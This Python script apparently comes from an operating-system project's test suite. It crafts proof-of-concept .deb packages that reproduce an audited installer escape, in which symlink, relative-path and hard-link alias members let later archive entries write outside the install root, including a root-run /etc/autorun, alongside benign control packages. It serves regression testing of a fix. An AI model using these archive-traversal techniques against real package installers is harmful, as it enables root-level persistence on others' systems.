#!/usr/bin/env python3
"""Craft the F-x86n-1 package-installer escape reproducers (2026-11-13 audit).

Committed copy of `attack/x86/net/craft_evil_deb.py` from the red-team report, so
the regression the fix in `src/pkg/install_fs.rs` addresses can be re-run against
a vulnerable or a fixed kernel. Nothing here is installed by the build or run by
CI; the driver is `tests/pkg/e2e_pkg_escape.py`.

The attack: a `.deb` `data.tar` may carry a symlink member and then a member
*below* it. The installer used to resolve later members' parents through symlinks
(including ones the package itself had just created), in the guest namespace where
`/etc` maps to `/mnt/etc`. Therefore

    ./y -> /etc        (symlink member)
    ./y/autorun        (regular member)

passes the `..`-escape check and lands at `/mnt/etc/autorun` — which the shell
executes as root at the next boot. `./x -> /` + `./x/pwned_root` writes
`/mnt/pwned_root` the same way.

Packages produced (deterministic bytes; mtimes are zero):

| file                 | purpose                                                     |
|----------------------|-------------------------------------------------------------|
| `evil-autorun.deb`   | `y -> /etc` + `y/autorun`: the persistent root-exec payload |
| `evil-symlink.deb`   | `x -> /` + `x/pwned_root`: write at the install root        |
| `evil-relative.deb`  | `z -> ../../..` + `z/escape`: relative escaping target      |
| `evil-dotdot.deb`    | plain `../../pwned_dotdot` (control: always refused)        |
| `evil-hardlink-alias.deb` | `d/y -> ../etc`, `d/h` HARDLINK to `d/y`, `d/h/autorun` HARDLINK to payload (F-r2-vfs-1) |
| `evil-hardlink-chain.deb` | alias of alias + `..`-normalized alias/member paths (F-r2-vfs-1) |
| `normal-hardlink.deb` | positive control: a hard link to a regular file (one inode, two names) |
| `normal-hello.deb`   | positive control: two files + one absolute symlink, no child |

`normal-hello.deb` deliberately keeps an absolute symlink member that nothing
descends through: storing link targets verbatim is a documented installer feature
(`alternatives`-style aliases), and the fix must not break it.

Usage:
    python3 tests/pkg/craft_evil_deb.py --out /tmp/pkg-poc
"""
from __future__ import annotations

import argparse
import gzip
import io
import os
import pathlib
import tarfile

#: Fixed timestamp so two runs produce byte-identical archives.
MTIME = 0


def ar_member(name: bytes, data: bytes) -> bytes:
    """One Debian `ar` member (the 60-byte header dpkg/ar emit)."""
    header = (
        name.ljust(16, b" ")
        + b"0".ljust(12, b" ")
        + b"0".ljust(6, b" ")
        + b"0".ljust(6, b" ")
        + b"100644".ljust(8, b" ")
        + str(len(data)).encode().ljust(10, b" ")
        + b"`\n"
    )
    assert len(header) == 60, len(header)
    out = header + data
    if len(data) % 2:
        out += b"\n"
    return out


def data_tar(members):
    """Gzip-compress a `data.tar` built from `(name, kind, payload, mode)` rows."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for name, kind, payload, mode in members:
            info = tarfile.TarInfo(name)
            info.mode = mode
            info.mtime = MTIME
            if kind == "sym":
                info.type = tarfile.SYMTYPE
                info.linkname = payload
                tf.addfile(info)
            elif kind == "hard":
                # POSIX hard link: `link(2)` on the target entry itself, without
                # following a final symlink (round-2 F-r2-vfs-1 primitive).
                info.type = tarfile.LNKTYPE
                info.linkname = payload
                tf.addfile(info)
            elif kind == "dir":
                info.type = tarfile.DIRTYPE
                tf.addfile(info)
            else:
                info.type = tarfile.REGTYPE
                info.size = len(payload)
                tf.addfile(info, io.BytesIO(payload))
    return gzip.compress(buf.getvalue(), 9)


def control_tar(package: str) -> bytes:
    """The minimal `control` member the parser accepts."""
    buf = io.BytesIO()
    data = (
        f"Package: {package}\nVersion: 1.0-1\nArchitecture: all\n"
        f"Maintainer: security regression <security@pagh.invalid>\n"
        f"Description: F-x86n-1 package-installer regression fixture\n"
    ).encode()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        info = tarfile.TarInfo("./control")
        info.size = len(data)
        info.mtime = MTIME
        tf.addfile(info, io.BytesIO(data))
    return gzip.compress(buf.getvalue(), 9)


def deb(package: str, members, path: pathlib.Path) -> pathlib.Path:
    """Write a full `.deb` (ar: debian-binary, control.tar.gz, data.tar.gz)."""
    blob = b"!<arch>\n"
    blob += ar_member(b"debian-binary", b"2.0\n")
    blob += ar_member(b"control.tar.gz", control_tar(package))
    blob += ar_member(b"data.tar.gz", data_tar(members))
    path.write_bytes(blob)
    return path


def build_all(out: pathlib.Path) -> dict[str, pathlib.Path]:
    """Generate every reproducer under `out` and return `name -> path`."""
    out.mkdir(parents=True, exist_ok=True)
    made = {
        # F-x86n-1 consequence: `/mnt/etc/autorun` runs as root at next boot.
        "evil-autorun.deb": deb(
            "evil-autorun",
            [
                ("./y", "sym", "/etc", 0o777),
                ("./y/autorun", "file", b"echo PWN-AUTORUN-VIA-PKG\n", 0o755),
            ],
            out / "evil-autorun.deb",
        ),
        # F-x86n-1: write directly at the install root.
        "evil-symlink.deb": deb(
            "evil-symlink",
            [
                ("./x", "sym", "/", 0o777),
                ("./x/pwned_root", "file", b"PWN-SYMLINK-ESCAPE\n", 0o644),
                ("./usr/bin/evil-ok", "file", b"ok\n", 0o755),
            ],
            out / "evil-symlink.deb",
        ),
        # Relative target that climbs above the root: same refusal class.
        "evil-relative.deb": deb(
            "evil-relative",
            [
                ("./z", "sym", "../../..", 0o777),
                ("./z/escape", "file", b"PWN-RELATIVE-ESCAPE\n", 0o644),
            ],
            out / "evil-relative.deb",
        ),
        # Control the old code already refused: a member path with `..`.
        "evil-dotdot.deb": deb(
            "evil-dotdot",
            [("../../pwned_dotdot", "file", b"PWN-DOTDOT\n", 0o644)],
            out / "evil-dotdot.deb",
        ),
        # F-r2-vfs-1 (round-2 audit): hard-link alias of an archive symlink. The
        # linker writes `./d/h/autorun` through the alias and lands at
        # `/mnt/etc/autorun`; a fixed installer refuses the whole package.
        "evil-hardlink-alias.deb": deb(
            "evil-hardlink-alias",
            [
                ("./d/pwn", "file", b"echo PWN-R2-HARDLINK-ALIAS\n", 0o755),
                ("./d/y", "sym", "../etc", 0o777),
                ("./d/h", "hard", "./d/y", 0o777),
                ("./d/h/autorun", "hard", "./d/pwn", 0o755),
            ],
            out / "evil-hardlink-alias.deb",
        ),
        # The same primitive with an alias of an alias, a `..`-normalized target
        # and a `..`-normalized member path below the second alias.
        "evil-hardlink-chain.deb": deb(
            "evil-hardlink-chain",
            [
                ("./d/pwn", "file", b"echo PWN-R2-HARDLINK-CHAIN\n", 0o755),
                ("./d/y", "sym", "../etc", 0o777),
                ("./d/h1", "hard", "./d/y", 0o777),
                ("./d/h2", "hard", "./d/h1", 0o777),
                ("./d/x/../h2/autorun", "hard", "./d/pwn", 0o755),
            ],
            out / "evil-hardlink-chain.deb",
        ),
        # Positive control: a normal hard link to a regular file still installs
        # (two names, one inode, never a copy).
        "normal-hardlink.deb": deb(
            "normal-hardlink",
            [
                ("./usr/bin/hello-real", "file", b"hello from hardlink control\n", 0o755),
                ("./usr/bin/hello-hard", "hard", "./usr/bin/hello-real", 0o755),
            ],
            out / "normal-hardlink.deb",
        ),
        # Positive control: a normal package still installs; includes an absolute
        # symlink with no member below it, which is legitimate and must survive.
        "normal-hello.deb": deb(
            "normal-hello",
            [
                ("./usr/bin/hello-pkg", "file", b"hello from normal-hello\n", 0o755),
                ("./usr/share/normal-hello/readme.txt", "file", b"fine\n", 0o644),
                ("./usr/bin/hello-alias", "sym", "/usr/bin/hello-pkg", 0o777),
            ],
            out / "normal-hello.deb",
        ),
    }
    return made


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--out",
        default=os.environ.get("PKG_POC_OUT", "/tmp/pagh-pkg-poc"),
        help="output directory (default: %(default)s)",
    )
    args = parser.parse_args()
    out = pathlib.Path(args.out)
    for name, path in sorted(build_all(out).items()):
        print(f"{name}: {path} ({path.stat().st_size} bytes)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())